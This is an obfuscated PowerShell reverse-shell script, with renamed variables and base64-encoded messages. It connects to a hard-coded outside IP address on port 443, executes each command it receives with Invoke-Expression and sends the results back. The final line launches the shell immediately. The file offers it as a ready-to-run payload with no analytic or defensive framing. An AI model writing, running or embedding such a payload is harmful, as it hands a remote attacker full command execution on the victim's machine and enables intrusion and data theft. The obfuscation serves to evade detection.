function _/=\__/==\___/\_/=
{ 
    [CmdletBinding(DefaultParameterSetName="Alenvers")] Param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="Alenvers")]
        [String]
        ${____/\__/=\/=\/=\_},
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="Alenvers")]
        [Int]
        ${___/=\_/====\/==\/},
        [Parameter(ParameterSetName="Alenvers")]
        [Switch]
        ${______/=\___/=\_/=}
    )
    try 
    {
        if (${______/=\___/=\_/=})
        {
            ${__/=\/\/===\/\_/\} = New-Object System.Net.Sockets.TCPClient(${____/\__/=\/=\/=\_},${___/=\_/====\/==\/})
        }
        ${/=\_/\/==\/\/====} = ${__/=\/\/===\/\_/\}.GetStream()
        [byte[]]${/=\____/\/\/\/\__} = 0..65535|%{0}
        ${/=\_/=\/=\/=\____} = ([text.encoding]::ASCII).GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IwAgAGEAbABlAG4AdgBlAHIAcwA+AA=='))))
        ${/=\_/\/==\/\/====}.Write(${/=\_/=\/=\/=\____},0,${/=\_/=\/=\/=\____}.Length)
        while((${_/\__/=\/\/\_/\/=} = ${/=\_/\/==\/\/====}.Read(${/=\____/\/\/\/\__}, 0, ${/=\____/\/\/\/\__}.Length)) -ne 0)
        {
            ${_/\__/=\/\/\_/\_/} = New-Object -TypeName System.Text.ASCIIEncoding
            ${_/==\/=\/=\_/===\} = ${_/\__/=\/\/\_/\_/}.GetString(${/=\____/\/\/\/\__},0, ${_/\__/=\/\/\_/\/=})
            try
            {
                ${/=\/==\_/\__/\/==} = (iex -Command ${_/==\/=\/=\_/===\} 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwBmACAAYwBvAG0AbQBhAG4AZAAgAG8AbgAgAHQAaABlACAAdABhAHIAZwBlAHQALgA='))) 
                Write-Error $_
            }
            ${_/\__/\/\/\__/\_/}  = ${/=\/==\_/\__/\/==} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IwAgAGEAbABlAG4AdgBlAHIAcwA+ACAA')))
            ${__/\/=\/=\_/=\_/=} = ($error[0] | Out-String)
            $error.clear()
            ${_/\__/\/\/\__/\_/} = ${_/\__/\/\/\__/\_/} + ${__/\/=\/=\_/=\_/=}
            ${_/\/=\/\/===\___/} = ([text.encoding]::ASCII).GetBytes(${_/\__/\/\/\__/\_/})
            ${/=\_/\/==\/\/====}.Write(${_/\/=\/\/===\___/},0,${_/\/=\/\/===\___/}.Length)
            ${/=\_/\/==\/\/====}.Flush()  
        }
        ${__/=\/\/===\/\_/\}.Close()
    }
    catch
    {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACEAIABDAGgAZQBjAGsAIABpAGYAIAB0AGgAZQAgAHMAZQByAHYAZQByACAAaQBzACAAcgBlAGEAYwBoAGEAYgBsAGUAIABhAG4AZAAgAHkAbwB1ACAAYQByAGUAIAB1AHMAaQBuAGcAIAB0AGgAZQAgAGMAbwByAHIAZQBjAHQAIABwAG8AcgB0AC4A'))) 
        Write-Error $_
    }
}
_/=\__/==\___/\_/= -______/=\___/=\_/= -____/\__/=\/=\/=\_ 37.187.38.82 -___/=\_/====\/==\/ 443
